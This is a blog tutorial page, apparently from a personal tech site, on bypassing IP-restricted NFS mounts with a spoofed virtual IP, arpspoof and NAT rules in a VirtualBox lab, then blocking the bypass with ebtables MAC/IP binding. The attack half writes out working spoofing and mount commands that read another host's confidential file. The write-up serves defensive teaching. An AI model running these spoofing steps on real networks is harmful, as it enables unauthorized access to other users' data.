@@ -1,0 +1,655 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<title>InterCloudZone</title>
+<meta name="keywords" content="" />
+<meta name="description" content="" />
+<link href="style.css" rel="stylesheet" type="text/css" media="screen" />
+<link href="google-code-prettify/sunburst.css" type="text/css" rel="stylesheet" />
+
+<!--[if IE]>
+<style type="text/css">
+#sidebar #calendar {
+	background-position: 0px 20px;
+}
+</style>
+<![endif]-->
+
+<script src="http://www.google.com/jsapi" type="text/javascript"></script>
+<script type="text/javascript">google.load("jquery", "1.3.2");</script>
+<script type="text/javascript" src="/google-code-prettify/prettify.js?autoload=true&;lang=css;skin=sunburst""></script>
+<script src="https://google-code-prettify.googlecode.com/svn/loader/run_prettify.js?autoload=true&amp;lang=css&amp;skin=sunburst"></script>
+</head>
+<body>
+<div id="logo">
+	<h1> InterCloudZone.com </h1>
+</div>
+<div id="menu">
+	<ul>
+		<li class="first"><a href="http://www.intercloudzone.com" accesskey="1" title="">Home</a></li>
+		<li><a href="http://sourceforge.net/projects/oraclerman/" accesskey="2" title="">OpenSource</a></li>
+		<li><a href="http://padmavyuha.blogspot.com/" accesskey="3" title="">Blogs</a></li>
+		<li><a href="http://www.linkedin.com/in/baburajkallarakkal" accesskey="4" title="">Profile</a></li>
+	</ul>
+	 
+</div>
+<hr />
+<!-- div id="banner"><img src="images/img09.jpg" alt="" width="960" height="147" / ></div -->
+<!-- start page -->
+
+<div id="swift-page" class="default-page" >
+	<!-- start content -->
+	<h2 class="title"> NFS Data Hacking using NAT/ARPSPOOF and preventing it using EBTABLES </h2>
+
+<p> 
+	This is a three phased approach: 
+</p> 
+
+<p> 
+1. How can you protect data by establishing security on NFS mounts.	
+</p> 
+<p> 
+2. How can you possibly work around in hacking that data still - a security breach so to speak.
+</p> 
+<p> 
+<p> 
+3. Knowing a security breach occured what methods can be employed to further tighten it.  
+</p> 
+
+<p> 
+So on highlevel - 
+</p> 
+
+<p> 
+	NFS shared mount access can be restricted to IP address's.
+</p>
+
+<p> 
+	Using NMAP Scans - we can obtain information on the neighbouring hosts on the same subnets.
+</p> 
+
+<p> 
+	By spinning up Virtual IP's and arpspoofs/arpings and also using NAT rules the server can still be accessed.
+</p> 
+
+<p> 
+	The level of granularity in securing this attack can be blocked by controling/using MAC address association - this can be accomplished using EBTABLES. 
+</p> 
+
+<p> 
+I have given a detailed picture of how NFS hacking can be done. i.e Step 1,2,3 described above already on my previous article -'NFS Hacking using NAT (Network-Address-Translation)'
+I shall still capture the steps here, but focus or goal is to how to accomplish #3.
+
+</p>
+
+<p>	
+So the basic setup remains same. 
+RBNETOPS will the NFS Server which is used to spin up the shared mounts
+RBNETAPP and RBNETLAB are two clients given access to mount their respective shares with access restricted by it's own IP Addressess.
+RBNETLAB will then be considered as a malicious host - who attempts to do network scan to identify the hosts around - finds and attempts
+to mount the directory owned by RBNETAPP and successfully mounts it.
+ </p>
+
+<p> 
+System admins at RBNETOPS later realizes that there's a security breach and a gap that need to filled up.This is where EBTABLES will come into play.
+</p>
+
+<p> 
+We need bridging because ultimately we need to setup ebtable rules which solely works on ETHERNET bridging.
+Bridge as the name implies acts as a bridge between two ethernets for packet traversal. Usually bridging is done by physical devices but can also be setup within the Linux kernel using bridge modules. 
+So to start with we need to install the bridge utils RPM. 
+</p> 
+	
+<pre>
+yum install bridge-utils
+</pre>				 
+				
+
+<p> 
+	By default bridges are not configured and ebtables can only work on ETHERNET bridges. So first - add the bridge. At this point a bridge is created by
+	no interfaces/IP addresses are tied to it.
+<p/>
+
+<pre>
+
+[root@rbnetops ~]# brctl addbr brnfs
+
+[root@rbnetops ~]# brctl show
+bridge name     bridge id               STP enabled     interfaces
+brnfs           8000.000000000000       no
+
+</pre>
+
+<p> 
+Before proceeding with any further steps, here is a snapshot of network interfaces and IP address associated with each.
+</p>
+
+
+<pre>
+[root@rbnetops network-scripts]# ifconfig
+enp0s3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.56.151  netmask 255.255.255.0  broadcast 192.168.56.255
+        inet6 fe80::a00:27ff:fe98:3854  prefixlen 64  scopeid 0x20<link>
+        ether 08:00:27:98:38:54  txqueuelen 1000  (Ethernet)
+        RX packets 658  bytes 89567 (87.4 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 221  bytes 35688 (34.8 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+enp0s8: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.2.151  netmask 255.255.255.0  broadcast 192.168.2.255
+        inet6 fe80::a00:27ff:fecb:b503  prefixlen 64  scopeid 0x20<link>
+        ether 08:00:27:cb:b5:03  txqueuelen 1000  (Ethernet)
+        RX packets 14904  bytes 1963214 (1.8 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 1088  bytes 95241 (93.0 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+... 
+
+output trimmed to omit loopback interface..
+</pre>	
+	
+<p> 
+Ideally bridging is done using two or more physical devices. In my case 192.168.56.151 is an interface defined as a 'Host-Only-Adapter' within VirtualBox
+and 192.168.2.151 is a 'Bridged Adapter' - basically I bridged that to my physical interface. Since these aren't same type of NIC's I wanted to avoid mixing
+up/using both NIC's to create the bridge. Hence going with only one enp0s8 here for the purpose of demo.
+
+The IP address of the NIC has to be set to 0.0.0.0 
+</p>
+ 
+<pre>
+[root@rbnetops network-scripts]# ifconfig enp0s8 0.0.0.0 down
+</pre>	
+	
+<p> 
+Attach the ethernet interface to the bridge.Once added you can see the bridge name and interfaces associated with it
+All these setups are temporary. In order for a permanent configuration the /etc/sysconfig/network-scripts/ifcfg-enp0s8
+file need to be edited to add the brdige details so the configuration stays.
+
+</p>
+ 
+<pre>
+ 
+[root@rbnetops network-scripts]# brctl addif brnfs enp0s8
+
+[root@rbnetops network-scripts]# brctl show
+bridge name     bridge id               STP enabled     interfaces
+brnfs           8000.080027cbb503       no              enp0s8
+
+</pre>	
+	
+<p> 
+ Bring up the interface, as you can see there is no IP address associated with enp0s8.
+</p>
+ 
+<pre>
+ 
+[root@rbnetops network-scripts]# ifconfig enp0s8 up
+
+[root@rbnetops network-scripts]# ifconfig
+enp0s3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.56.151  netmask 255.255.255.0  broadcast 192.168.56.255
+        inet6 fe80::a00:27ff:fe98:3854  prefixlen 64  scopeid 0x20<link>
+        ether 08:00:27:98:38:54  txqueuelen 1000  (Ethernet)
+        RX packets 980  bytes 122441 (119.5 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 464  bytes 70011 (68.3 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+enp0s8: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet6 fe80::a00:27ff:fecb:b503  prefixlen 64  scopeid 0x20<link>
+        ether 08:00:27:cb:b5:03  txqueuelen 1000  (Ethernet)
+        RX packets 16168  bytes 2076355 (1.9 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 1098  bytes 96074 (93.8 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+...
+output trimmed...
+
+</pre>	
+	
+<p> 
+Bring the bridge interface up, you can see it's up and RUNNING although there isn't an IP address associated with it still.
+
+</p>
+ 
+<pre>
+ [root@rbnetops network-scripts]# ifconfig brnfs up
+
+
+[root@rbnetops network-scripts]# ifconfig brnfs
+brnfs: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet6 fe80::a00:27ff:fecb:b503  prefixlen 64  scopeid 0x20<link>
+        ether 08:00:27:cb:b5:03  txqueuelen 0  (Ethernet)
+        RX packets 337  bytes 51239 (50.0 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 8  bytes 648 (648.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+</pre>	
+	
+<p> 
+brctl command has options which can be used to show what MAC addresses are being discovered by the bridge that it can communicate with.
+</p>
+ 
+<pre>
+ 
+[root@rbnetops network-scripts]# brctl showmacs brnfs
+port no mac addr                is local?       ageing timer
+  1     00:1f:bc:02:6f:11       no               135.92
+  1     08:00:27:cb:b5:03       yes                0.00
+  1     08:00:27:cb:b5:03       yes                0.00
+  1     5c:d9:98:60:6a:1e       no                 0.32
+
+</pre>	
+	
+<p> 
+Now attach an IP address to the bridge interface.
+</p>
+ 
+<pre>
+ 
+[root@rbnetops network-scripts]# ifconfig brnfs 192.168.2.151
+
+
+[root@rbnetops network-scripts]# ifconfig
+brnfs: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.2.151  netmask 255.255.255.0  broadcast 192.168.2.255
+        inet6 fe80::a00:27ff:fecb:b503  prefixlen 64  scopeid 0x20<link>
+        ether 08:00:27:cb:b5:03  txqueuelen 0  (Ethernet)
+        RX packets 768  bytes 72295 (70.6 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 17  bytes 2837 (2.7 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+enp0s3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.56.151  netmask 255.255.255.0  broadcast 192.168.56.255
+        inet6 fe80::a00:27ff:fe98:3854  prefixlen 64  scopeid 0x20<link>
+        ether 08:00:27:98:38:54  txqueuelen 1000  (Ethernet)
+        RX packets 1123  bytes 138298 (135.0 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 576  bytes 86993 (84.9 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+enp0s8: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet6 fe80::a00:27ff:fecb:b503  prefixlen 64  scopeid 0x20<link>
+        ether 08:00:27:cb:b5:03  txqueuelen 1000  (Ethernet)
+        RX packets 16941  bytes 2160167 (2.0 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 1117  bytes 99063 (96.7 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+</pre>	
+	
+<p> 
+Now move onto RBNETLAB and configure the VIP (Virutal IP ) - using the IP address of RBNETAPP's machine. If you have logged in using putty/ssh to RBNETAPP
+using the ip address 192.168.2.152 you will potentially loose connectivity because of IP address conflicts now on the same subnet.
+
+</p>
+ 
+<pre>
+[root@rbnetlab ~]# ifconfig enp0s8:1 192.168.2.152 netmask 255.255.255.0 up
+
+[root@rbnetlab ~]# ifconfig enp0s8
+enp0s8: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.2.153  netmask 255.255.255.0  broadcast 192.168.2.255
+        inet6 fe80::a00:27ff:feb3:8bb2  prefixlen 64  scopeid 0x20<link>
+        ether 08:00:27:b3:8b:b2  txqueuelen 1000  (Ethernet)
+        RX packets 16507  bytes 1074253 (1.0 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 740  bytes 97038 (94.7 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+[root@rbnetlab ~]# ifconfig enp0s8:1
+enp0s8:1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.2.152  netmask 255.255.255.0  broadcast 192.168.2.255
+        ether 08:00:27:b3:8b:b2  txqueuelen 1000  (Ethernet)
+
+</pre>	
+
+<p> 
+
+
+
+
+</p>
+ 
+<pre>
+[root@rbnetlab ~]# sysctl net.ipv4.ip_nonlocal_bind=1
+net.ipv4.ip_nonlocal_bind = 1
+
+[root@rbnetlab ~]# echo "1" > /proc/sys/net/ipv4/ip_forward
+
+[root@rbnetlab ~]# arpspoof -i enp0s8 -t 192.168.2.151  192.168.2.152
+</pre>	
+
+
+
+<p> 
+Here are the steps to do NAT'ing otherwise we need to mangle the packets. 
+</p>
+
+<p>
+There are two steps here. One is doing Source NAT and another is Destination NAT. Source NAT is done 
+in POSTROUTING chain so that the packets right before packets were being sent out by kernel 
+it's mangled to make sure the outgoing IP address is 192.168.2.152 ( Virutal IP).
+</p>
+
+<p>
+Same is the case with the PREROUTING chain, any incoming packets received are intercepted
+and mangled so that the local kernel processes once they receive them will see it as a packet
+came from 192.168.2.152.
+</p>
+
+<p>
+Starting with Redhat/CentOS 7.x - the legacy IPTABLES are being taken over by firewalld. Basically 
+firewalld offers lot of efficiency and it's wrapped around the legacy iptables so still allows 
+to use the iptable rules to be defined. That's done through 'passthrough' functionality.
+</p>
+ 
+<pre>
+
+firewall-cmd --direct --passthrough ipv4 -t nat -I POST_trusted -s 192.168.2.153 -j SNAT --to 192.168.2.152
+firewall-cmd --direct --passthrough ipv4 -t nat -I PRE_trusted -s 192.168.2.152 -j DNAT --to 192.168.2.153
+
+
+[root@rbnetlab ~]# firewall-cmd --direct --passthrough ipv4 -t nat -I POST_trusted -s 192.168.2.153 -j SNAT --to 192.168.2.152
+success
+[root@rbnetlab ~]# firewall-cmd --direct --passthrough ipv4 -t nat -I PRE_trusted -s 192.168.2.152 -j DNAT --to 192.168.2.153
+success
+
+</pre>	
+	
+<p> 
+I ran into some issues with  PUBLIC zone of firewalld, so switched to 'trusted' zone
+temporarily. Yet to figure out the reason as to why it didn't work but for now going
+with 'trusted' zone.
+</p>
+ 
+<pre>
+ [root@rbnetlab ~]#  firewall-cmd --zone=trusted --change-interface=enp0s8
+success
+[root@rbnetlab ~]#  firewall-cmd --get-zone-of-interface=enp0s8
+trusted
+
+[root@rbnetlab ~]# firewall-cmd --zone=trusted
+success
+
+[root@rbnetlab ~]# firewall-cmd --get-default-zone
+trusted
+
+</pre>	
+
+
+	
+<p> 
+
+Here is a snap of iptables rules once it's been added.
+
+</p>
+ 
+<pre>
+  
+[root@rbnetlab ~]# iptables -t nat -L
+Chain PREROUTING (policy ACCEPT)
+target     prot opt source               destination
+PREROUTING_direct  all  --  anywhere             anywhere
+PREROUTING_ZONES_SOURCE  all  --  anywhere             anywhere
+PREROUTING_ZONES  all  --  anywhere             anywhere
+
+Chain INPUT (policy ACCEPT)
+target     prot opt source               destination
+
+Chain OUTPUT (policy ACCEPT)
+target     prot opt source               destination
+OUTPUT_direct  all  --  anywhere             anywhere
+
+Chain POSTROUTING (policy ACCEPT)
+target     prot opt source               destination
+POSTROUTING_direct  all  --  anywhere             anywhere
+POSTROUTING_ZONES_SOURCE  all  --  anywhere             anywhere
+POSTROUTING_ZONES  all  --  anywhere             anywhere
+
+Chain OUTPUT_direct (1 references)
+target     prot opt source               destination
+
+Chain POSTROUTING_ZONES (1 references)
+target     prot opt source               destination
+POST_trusted  all  --  anywhere             anywhere
+POST_trusted  all  --  anywhere             anywhere
+POST_trusted  all  --  anywhere             anywhere
+
+Chain POSTROUTING_ZONES_SOURCE (1 references)
+target     prot opt source               destination
+
+Chain POSTROUTING_direct (1 references)
+target     prot opt source               destination
+
+Chain POST_trusted (3 references)
+target     prot opt source               destination
+SNAT       all  --  rbnetlab             anywhere             to:192.168.2.152
+POST_trusted_log  all  --  anywhere             anywhere
+POST_trusted_deny  all  --  anywhere             anywhere
+POST_trusted_allow  all  --  anywhere             anywhere
+
+Chain POST_trusted_allow (1 references)
+target     prot opt source               destination
+
+Chain POST_trusted_deny (1 references)
+target     prot opt source               destination
+
+Chain POST_trusted_log (1 references)
+target     prot opt source               destination
+
+Chain PREROUTING_ZONES (1 references)
+target     prot opt source               destination
+PRE_trusted  all  --  anywhere             anywhere
+PRE_trusted  all  --  anywhere             anywhere
+PRE_trusted  all  --  anywhere             anywhere
+
+Chain PREROUTING_ZONES_SOURCE (1 references)
+target     prot opt source               destination
+
+Chain PREROUTING_direct (1 references)
+target     prot opt source               destination
+
+Chain PRE_trusted (3 references)
+target     prot opt source               destination
+DNAT       all  --  rbnetapp             anywhere             to:192.168.2.153
+PRE_trusted_log  all  --  anywhere             anywhere
+PRE_trusted_deny  all  --  anywhere             anywhere
+PRE_trusted_allow  all  --  anywhere             anywhere
+
+Chain PRE_trusted_allow (1 references)
+target     prot opt source               destination
+
+Chain PRE_trusted_deny (1 references)
+target     prot opt source               destination
+
+Chain PRE_trusted_log (1 references)
+target     prot opt source               destination
+
+</pre>	
+	
+	
+	
+<p> 
+Let's attempt the hack again basically to see if the mounts are working fine.
+
+</p>
+ 
+<pre>
+ 
+[root@rbnetlab ~]# mount -t nfs -o addr=192.168.2.152 rbnetops:/u01/data/nfsshare_rbnetapp /u01/hackit/  -v
+mount.nfs: timeout set for Wed May  6 14:44:08 2015
+mount.nfs: trying text-based options 'vers=4,addr=192.168.2.151,clientaddr=192.168.2.153'
+
+
+[root@rbnetlab ~]# cd /u01/hackit/
+
+[root@rbnetlab hackit]# ls -ltr
+total 4
+-rw-r--r--. 1 root root 32 Apr  2 13:24 rbnetapp.dat
+[root@rbnetlab hackit]# cat rbnetapp.dat
+Confidential created @ rbnetapp
+
+</pre>	
+
+
+	
+<p> 
+Configure firewalld on RBNEOPS. This is required for setting up EBTABLES.
+
+</p>
+ 
+<pre>
+ 
+
+systemctl start firewalld
+systemctl status firewalld
+systemctl start ebtables
+
+
+[root@rbnetops network-scripts]# systemctl start firewalld
+[root@rbnetops network-scripts]# systemctl status firewalld
+firewalld.service - firewalld - dynamic firewall daemon
+   Loaded: loaded (/usr/lib/systemd/system/firewalld.service; enabled)
+   Active: active (running) since Wed 2015-05-06 14:51:08 EDT; 14ms ago
+ Main PID: 14127 (firewalld)
+   CGroup: /system.slice/firewalld.service
+           ââ14127 /usr/bin/python -Es /usr/sbin/firewalld --nofork --nopid
+           ââ14181 /usr/bin/python -Es /usr/sbin/firewalld --nofork --nopid
+
+May 06 14:51:08 rbnetops.intercloudzone.com systemd[1]: Starting firewalld - dynamic firewall d.....
+May 06 14:51:08 rbnetops.intercloudzone.com systemd[1]: Started firewalld - dynamic firewall daemon.
+Hint: Some lines were ellipsized, use -l to show in full.
+
+</pre>	
+	
+<p> 
+Configure ebtables. EBTABLES is similar to IPTABLES but working in the Data Link Layer.
+Right now as you can see the rules are empty.
+</p>
+ 
+<pre>
+
+[root@rbnetops network-scripts]# ebtables -L --Lc
+Bridge table: filter
+
+Bridge chain: INPUT, entries: 0, policy: ACCEPT
+
+Bridge chain: FORWARD, entries: 0, policy: ACCEPT
+
+Bridge chain: OUTPUT, entries: 0, policy: ACCEPT
+
+[root@rbnetops network-scripts]# systemctl start ebtables
+
+</pre>	
+	
+<p> 
+
+May be there's a way to setup the EBTABLE rules without the passthrough option (yet to explore), but with quite a few hurdles/learning this is
+the only way I know now!
+
+The main thing to note here is IP/MAC association in the rule. So basically when a request is triggered with our NAT and arpspoofing from RBNETLAP while
+it hits RBNETOPS the ebtable rules kicks in and rules checks this association and will take the action according to the last parameter ( -j ACCEPT or -j DROP).
+
+
+</p>
+ 
+<pre>
+ 
+On RBNETOPS run the below..
+
+firewall-cmd --direct --passthrough eb -A INPUT -p IPv4 -s 08:00:27:85:30:eb --ip-src 192.168.2.152 -j ACCEPT
+firewall-cmd --direct --passthrough eb -A INPUT -p IPv4 -s 08:00:27:b3:8b:b2 --ip-src 192.168.2.153 -j ACCEPT
+firewall-cmd --direct --passthrough eb -A INPUT -p IPv4 --limit 5/min --limit-burst 2 --log-level notice --log-prefix "EBTABLE RULE VIOLATION" --log-ip --log-arp -j DROP
+firewall-cmd --direct --passthrough eb -A INPUT -p IPv4  -j DROP
+
+</pre>	
+	
+<p> 
+Here is a snap of the rules after it's being added.
+</p>
+ 
+<pre>
+ 
+
+[root@rbnetops network-scripts]# ebtables -L --Lc
+Bridge table: filter
+
+Bridge chain: INPUT, entries: 4, policy: ACCEPT
+-p IPv4 -s 8:0:27:85:30:eb --ip-src 192.168.2.152 -j ACCEPT , pcnt = 0 -- bcnt = 0
+-p IPv4 -s 8:0:27:b3:8b:b2 --ip-src 192.168.2.153 -j ACCEPT , pcnt = 0 -- bcnt = 0
+-p IPv4 --limit 5/min --limit-burst 2 --log-level notice --log-prefix "EBTABLE RULE VIOLATION" --log-ip --log-arp -j DROP , pcnt = 0 -- bcnt = 0
+-p IPv4 -j DROP , pcnt = 0 -- bcnt = 0
+
+Bridge chain: FORWARD, entries: 0, policy: ACCEPT
+
+Bridge chain: OUTPUT, entries: 0, policy: ACCEPT
+</pre>	
+	
+<p> 
+Now that rules are in place, attempt a mount again. The mount get's hung / stuck at the prompt...
+
+</p>
+ 
+<pre>
+ 
+[root@rbnetlab ~]# mount -t nfs -o addr=192.168.2.152 rbnetops:/u01/data/nfsshare_rbnetapp /u01/hackit/  -v
+mount.nfs: timeout set for Wed May  6 14:57:49 2015
+mount.nfs: trying text-based options 'vers=4,addr=192.168.2.151,clientaddr=192.168.2.153'
+
+</pre>	
+	
+<p> 
+
+Now to look at or to find why the mount isn't happening, log back into RBNETOPS and see what's happening. You can see the packets are dropped by ebtables and if 
+you refer back to the rules there's a log prefix added " --log-prefix "EBTABLE RULE VIOLATION"  which is what you can see in the logs as comments for every packet being
+dropped. The limit-burst and limits on the rules prevent to flood the logs with repeated lines. 
+
+</p>
+ 
+<pre>
+ 
+[root@rbnetops network-scripts]# tail -f /var/log/messages
+May  6 14:54:57 rbnetops kernel: nf_conntrack version 0.5.0 (16384 buckets, 65536 max)
+May  6 14:54:57 rbnetops ebtables: [  OK  ]
+May  6 14:54:57 rbnetops kernel: Ebtables v2.0 unregistered
+May  6 14:54:57 rbnetops systemd: Stopped Ethernet Bridge Filtering tables.
+May  6 14:54:57 rbnetops kernel: ip6_tables: (C) 2000-2006 Netfilter Core Team
+May  6 14:54:57 rbnetops kernel: Ebtables v2.0 registered
+May  6 14:54:57 rbnetops systemd: Started firewalld - dynamic firewall daemon.
+May  6 14:55:01 rbnetops systemd: Created slice user-992.slice.
+May  6 14:55:01 rbnetops systemd: Starting Session 59 of user pcp.
+May  6 14:55:01 rbnetops systemd: Started Session 59 of user pcp.
+May  6 14:55:44 rbnetops chronyd[685]: Can't synchronise: no reachable sources
+May  6 14:55:49 rbnetops kernel: EBTABLE RULE VIOLATION IN=enp0s8 OUT= MAC source = 08:00:27:b3:8b:b2 MAC dest = 08:00:27:cb:b5:03 proto = 0x0800 IP SRC=192.168.2.152 IP DST=192.168.2.151, IP tos=0x00, IP proto=6 SPT=999 DPT=2049
+May  6 14:55:50 rbnetops kernel: EBTABLE RULE VIOLATION IN=enp0s8 OUT= MAC source = 08:00:27:b3:8b:b2 MAC dest = 08:00:27:cb:b5:03 proto = 0x0800 IP SRC=192.168.2.152 IP DST=192.168.2.151, IP tos=0x00, IP proto=6 SPT=999 DPT=2049
+
+
+
+</pre>	
+	 
+ 
+<p>
+	Thanks for visiting the site.
+</p>
+  
+<script>$( "pre" ).addClass( "prettyprint" );</script>	
+	
+	<div id="content">
+	<!-- end content -->
+	</div>
+<!-- end page -->
+<div id="footer">
+	<p class="legal">Copyright (c) 2015-2020 InterCloudZone.com. All rights reserved.</p>
+</div>
+
+
+
+</body>
+
+</html>
